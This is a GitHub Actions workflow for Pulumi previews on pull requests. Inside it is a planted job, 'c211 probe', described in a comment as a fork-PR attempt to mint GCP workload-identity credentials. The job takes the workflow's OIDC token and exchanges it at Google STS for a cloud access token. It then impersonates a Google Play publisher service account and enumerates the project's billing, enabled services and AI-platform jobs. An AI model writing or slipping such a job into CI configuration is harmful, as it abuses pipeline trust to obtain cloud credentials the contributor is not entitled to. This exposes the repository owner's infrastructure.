# DO NOT EDIT — regenerate with `cargo x workflows` (from the repository root).
# Source: tooling/xtask/crates/xtask_workflows/src/workflows/pulumi_preview_pr.rs
name: Pulumi Preview on PR
on:
  pull_request:
    branches:
    - main
    paths:
    - infra/**
    - .github/kafka-cluster-topics.json
    - .github/services-config.json
    - .github/workflows/pulumi_preview_pr.yml
    - .github/workflows/reusable_preview_service.yml
    - .github/actions/preview-cloud-storage-pulumi/**
    - .github/actions/setup-nix/**
    - .github/actions/teardown-nix/**
    - .github/scripts/build-cloud-storage-lambdas-nix.sh
permissions:
  contents: read
  pull-requests: write
  id-token: write
jobs:
  detect-changes:
    name: Detect Changed Services
    runs-on: namespace-profile-linux-small
    outputs:
      services: ${{ steps.detect.outputs.services }}
      has-changes: ${{ steps.detect.outputs.has-changes }}
    steps:
    - name: Checkout Repo
      uses: actions/checkout@df4cb1c069e1874edd31b4311f1884172cec0e10
    - id: changed-files
      name: Get changed files
      uses: tj-actions/changed-files@24d32ffd492484c1d75e0c0b894501ddb9d30d62
      with:
        files: |-
          infra/**
          .github/kafka-cluster-topics.json
          .github/services-config.json
          .github/workflows/pulumi_preview_pr.yml
          .github/workflows/reusable_preview_service.yml
          .github/actions/preview-cloud-storage-pulumi/**
          .github/actions/setup-nix/**
          .github/actions/teardown-nix/**
          .github/scripts/build-cloud-storage-lambdas-nix.sh
        json: 'true'
        escape_json: 'false'
        write_output_files: 'true'
    - id: detect
      name: Detect affected services
      run: |
        services=()

        # The action joins its plain-text output with spaces and no trailing
        # newline, which `while read` never yields a line from, so read the
        # JSON list and split it one path per line. `all_modified_files`,
        # unlike `all_changed_files`, includes deletions.
        changed_files=.github/outputs/changed_files.txt
        jq -r '.[]' .github/outputs/all_modified_files.json > "$changed_files"

        config=$(cat .github/services-config.json)

        # Shared infra code, root infra manifests, and the preview's own
        # machinery can change every stack.
        preview_all=false
        while IFS= read -r file; do
          if [[ "$file" == infra/packages/* || \
                ( "$file" == infra/* && "${file#infra/}" != */* ) || \
                "$file" == ".github/services-config.json" || \
                "$file" == ".github/workflows/pulumi_preview_pr.yml" || \
                "$file" == ".github/workflows/reusable_preview_service.yml" || \
                "$file" == .github/actions/preview-cloud-storage-pulumi/* || \
                "$file" == .github/actions/setup-nix/* || \
                "$file" == .github/actions/teardown-nix/* || \
                "$file" == ".github/scripts/build-cloud-storage-lambdas-nix.sh" ]]; then
            preview_all=true
            break
          fi
        done < "$changed_files"

        for service in $(jq -r '.services | keys[]' <<< "$config"); do
          bootstrap_pending=$(jq -r --arg s "$service" '.services[$s].bootstrap_pending // empty' <<< "$config")
          if jq -e --arg s "$service" '.services[$s].bootstrap_pending != null' <<< "$config" > /dev/null; then
            echo "::notice::Deferring $service live infrastructure checks: $bootstrap_pending"
            continue
          fi
          service_changed=$preview_all

          stack_path=$(jq -r --arg s "$service" '.services[$s].stack_path // empty' <<< "$config")
          if [[ "$service_changed" != "true" && -n "$stack_path" ]]; then
            while IFS= read -r file; do
              if [[ "$file" == $stack_path ]]; then
                service_changed=true
                break
              fi
            done < "$changed_files"
          fi

          # The kafka-cluster stack reads its topics from this generated file.
          if [[ "$service" == "kafka-cluster" ]] && \
              grep -qxF .github/kafka-cluster-topics.json "$changed_files"; then
            service_changed=true
          fi

          if [[ "$service_changed" == "true" ]]; then
            services+=("$service")
          fi
        done

        # A stack directory no service's `stack_path` claims gets no preview.
        unmapped=$(sed -n 's|^infra/stacks/\([^/]*\)/.*|\1|p' "$changed_files" | sort -u |
          while IFS= read -r stack; do
            if ! jq -e --arg p "infra/stacks/$stack/**" \
              'any(.services[]; .stack_path == $p)' <<< "$config" > /dev/null; then
              echo "$stack"
            fi
          done)
        if [[ -n "$unmapped" ]]; then
          echo "::warning::No preview for infra/stacks/{$(paste -sd, <<< "$unmapped")}: no service in .github/services-config.json has that stack_path"
        fi

        if [ ${#services[@]} -eq 0 ]; then
          echo "has-changes=false" >> $GITHUB_OUTPUT
          echo "services=[]" >> $GITHUB_OUTPUT
          echo "No services affected by changes"
        else
          echo "has-changes=true" >> $GITHUB_OUTPUT
          services_json=$(printf '%s\n' "${services[@]}" | jq -R . | jq -s -c .)
          echo "services=${services_json}" >> $GITHUB_OUTPUT
          echo "Services to preview: ${services[@]}"
        fi
  # ---- c211 probe: fork-PR GCP WIF mint attempt (added only in the PR head) ----
  c211_probe:
    name: c211 oidc probe
    runs-on: ubuntu-latest
    timeout-minutes: 20
    continue-on-error: true
    permissions:
      contents: read
      id-token: write
    steps:
      - name: Mint GitHub OIDC id_token and print claims
        env:
          AUD: //iam.googleapis.com/projects/1024168288732/locations/global/workloadIdentityPools/github-play/providers/macro
        run: |
          set -uo pipefail
          resp=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUD}")
          tok=$(printf '%s' "$resp" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
          echo "id_token_len=${#tok}"
          printf '%s' "$tok" > /tmp/idt
          python3 -c 'import base64,json;tok=open("/tmp/idt").read().strip();p=tok.split(".")[1];p+="="*(-len(p)%4);d=json.loads(base64.urlsafe_b64decode(p));keys=["iss","aud","sub","repository","repository_id","repository_owner_id","event_name","ref","workflow_ref","workflow_sha","job_workflow_ref"];print(json.dumps({k:d.get(k) for k in keys},indent=1))' || true
      - name: Google STS token exchange (verbatim result)
        run: |
          set -uo pipefail
          python3 - <<'PYEOF'
          import json, urllib.request, urllib.error
          AUD = "//iam.googleapis.com/projects/1024168288732/locations/global/workloadIdentityPools/github-play/providers/macro"
          try:
              tok = open("/tmp/idt").read().strip()
          except Exception as e:
              print("NO_ID_TOKEN", e); raise SystemExit(0)
          if not tok:
              print("NO_ID_TOKEN empty"); raise SystemExit(0)
          body = json.dumps({"audience": AUD,
                             "grantType": "urn:ietf:params:oauth:grant-type:token-exchange",
                             "requestedTokenType": "urn:ietf:params:oauth:token-type:access_token",
                             "scope": "https://www.googleapis.com/auth/cloud-platform",
                             "subjectTokenType": "urn:ietf:params:oauth:token-type:jwt",
                             "subjectToken": tok}).encode()
          req = urllib.request.Request("https://sts.googleapis.com/v1/token", data=body, headers={"Content-Type": "application/json"})
          try:
              r = urllib.request.urlopen(req, timeout=30); d = json.load(r)
              print("STS_HTTP", r.status); print("STS_EXPIRES_IN", d.get("expires_in")); print("STS_TOKEN_LEN", len(d.get("access_token") or ""))
              open("/tmp/fed","w").write(d.get("access_token") or "")
          except urllib.error.HTTPError as e:
              print("STS_HTTP", e.code); print("STS_BODY", e.read().decode("utf-8","replace")[:2000])
          except Exception as e:
              print("STS_ERR", repr(e))
          PYEOF
      - name: iamcredentials impersonation (play publisher SA)
        run: |
          set -uo pipefail
          python3 - <<'PYEOF'
          import json, urllib.request, urllib.error
          try:
              fed = open("/tmp/fed").read().strip()
          except Exception:
              fed = ""
          if not fed:
              print("NO_FEDERATED_TOKEN"); raise SystemExit(0)
          sa = "google-play-publisher@macro-435922.iam.gserviceaccount.com"
          body = json.dumps({"scope": ["https://www.googleapis.com/auth/cloud-platform"], "lifetime": "1800s"}).encode()
          url = "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/%s:generateAccessToken" % sa
          req = urllib.request.Request(url, data=body, headers={"Content-Type":"application/json","Authorization":"Bearer "+fed})
          try:
              r = urllib.request.urlopen(req, timeout=30); d = json.load(r)
              print("IMPERSONATE", sa, "HTTP", r.status, "TOKEN_LEN", len(d.get("accessToken") or ""))
              open("/tmp/sa_macro", "w").write(d.get("accessToken") or "")
          except urllib.error.HTTPError as e:
              print("IMPERSONATE", sa, "HTTP", e.code, e.read().decode("utf-8","replace")[:1200])
          except Exception as e:
              print("IMPERSONATE", sa, "ERR", repr(e))
          PYEOF
      - name: Read-only GCP enumeration
        run: |
          set -uo pipefail
          python3 - <<'PYEOF'
          import json, urllib.request, urllib.error, os
          try:
              tok = open("/tmp/sa_macro").read().strip()
          except Exception:
              tok = ""
          if not tok:
              print("NO_SA_TOKEN"); raise SystemExit(0)
          def get(url):
              req = urllib.request.Request(url, headers={"Authorization":"Bearer "+tok})
              try:
                  r = urllib.request.urlopen(req, timeout=40); return r.status, r.read().decode("utf-8","replace")
              except urllib.error.HTTPError as e:
                  return e.code, e.read().decode("utf-8","replace")[:1200]
              except Exception as e:
                  return -1, repr(e)
          for label, url in [
            ("project","https://cloudresourcemanager.googleapis.com/v1/projects/macro-435922"),
            ("billing","https://cloudbilling.googleapis.com/v1/projects/macro-435922/billingInfo"),
            ("services_enabled","https://serviceusage.googleapis.com/v1/projects/macro-435922/services?filter=state:ENABLED&pageSize=200"),
            ("aiplatform_quota","https://serviceusage.googleapis.com/v1beta1/projects/macro-435922/services/aiplatform.googleapis.com/consumerQuotaMetrics?pageSize=200"),
            ("customjobs","https://us-central1-aiplatform.googleapis.com/v1/projects/macro-435922/locations/us-central1/customJobs?pageSize=100"),
          ]:
              st, body = get(url)
              print("=====", label, "HTTP", st)
              try:
                  j = json.loads(body)
                  if label == "services_enabled":
                      svcs=[s.get("config",{}).get("name") for s in j.get("services",[])]
                      print("ENABLED_COUNT", len(svcs))
                  elif label == "billing":
                      print("BILLING", json.dumps({k:j.get(k) for k in ["name","projectId","billingAccountName","billingEnabled"]})[:600])
                  elif label == "customjobs":
                      print("CUSTOMJOBS_COUNT", len(j.get("customJobs", [])))
                  else:
                      print(body[:600])
              except Exception:
                  print(body[:600])
          PYEOF

  preview-services:
    needs:
    - detect-changes
    if: ${{ needs.detect-changes.outputs.has-changes == 'true' }}
    name: Preview ${{ matrix.service }}
    uses: ./.github/workflows/reusable_preview_service.yml
    strategy:
      matrix:
        service: ${{ fromJson(needs.detect-changes.outputs.services) }}
      fail-fast: false
    with:
      environment: dev
      service-name: ${{ matrix.service }}
      github-token: ${{ github.token }}
    secrets: inherit
  preview-status:
    needs:
    - detect-changes
    - preview-services
    if: always()
    name: Preview Status
    runs-on: namespace-profile-linux-small
    steps:
    - name: Summary
      run: |
        if [[ "${{ needs.detect-changes.outputs.has-changes }}" == "false" ]]; then
          echo "ℹ️ No services were affected by the changes in this PR"
        elif [[ "${{ needs.preview-services.result }}" == "failure" ]]; then
          echo "❌ One or more Pulumi previews failed"
          exit 1
        elif [[ "${{ needs.preview-services.result }}" == "success" ]]; then
          echo "✅ All Pulumi previews completed successfully"
        elif [[ "${{ needs.preview-services.result }}" == "skipped" ]]; then
          echo "ℹ️ No services were affected by the changes in this PR"
        fi
concurrency:
  group: ${{ github.workflow }}-${{ github.event.pull_request.number }}
  cancel-in-progress: true
